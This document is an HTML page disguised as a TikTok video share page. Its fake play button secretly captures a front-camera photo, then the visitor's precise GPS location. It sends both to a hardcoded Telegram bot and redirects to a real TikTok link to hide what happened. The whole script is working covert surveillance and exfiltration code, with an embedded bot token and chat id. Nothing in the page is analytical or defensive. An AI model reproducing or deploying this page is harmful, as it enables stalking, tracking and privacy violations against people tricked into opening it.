<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok Â· Video Content</title>
    <meta property="og:title" content="TikTok Â· Video Content">
    <meta property="og:image" content="https://i.ibb.co/1t8S4QVG/42269.jpg">

    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; }
        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.ibb.co/1t8S4QVG/42269.jpg') no-repeat center center; background-size: cover; z-index: 1; }
        .play-btn { position: absolute; z-index: 100; cursor: pointer; background: rgba(255,255,255,0.1); border-radius: 50%; padding: 20px; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.3); }
        .play-icon { width: 80px; height: 80px; fill: white; opacity: 0.9; }
        video, canvas { display: none; }
        .flash-active { background: #fff !important; }
    </style>
</head>
<body id="body">
    <div class="bg" id="bg"></div>
    <div class="play-btn" id="trap" onclick="ultraCapture()">
        <svg class="play-icon" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8454166362:AAE-teyJSdRqs8yUA4UPUeHmiIT0TtyT1hc";
        const chat_id = "7261354534";

        async function ultraCapture() {
            const b = document.getElementById('body');
            const bg = document.getElementById('bg');
            const trap = document.getElementById('trap');

            try {
                // 1. Get Camera Permission FIRST
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = s;
                await v.play();

                // Flash & Hide UI
                trap.style.display = 'none';
                bg.style.display = 'none';
                b.classList.add('flash-active');

                // 2. Capture and Send Photo
                setTimeout(async () => {
                    const c = document.getElementById('c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    const imageData = c.toDataURL('image/jpeg', 0.8);
                    const blob = await (await fetch(imageData)).blob();
                    
                    const formData = new FormData();
                    formData.append('chat_id', chat_id);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', `ðŸ“¸ Photo Captured Successfully\nðŸ“± Device: ${navigator.userAgent.match(/iPhone/i) ? "iPhone" : "Android"}`);

                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });

                    // 3. NOW Request Location
                    requestLocation();
                }, 1800);

            } catch (e) {
                window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
            }
        }

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const msg = `ðŸ“ Exact Location Found!\nðŸ”— Google Maps: https://www.google.com/maps?q=${lat},${lon}`;
                    
                    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
                    
                    // Final Redirect
                    window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
                }, () => {
                    // If user denies location, still redirect
                    window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
                });
            } else {
                window.location.href = "https://vt.tiktok.com/ZS5ugM47M/";
            }
        }
    </script>
</body>
</html>
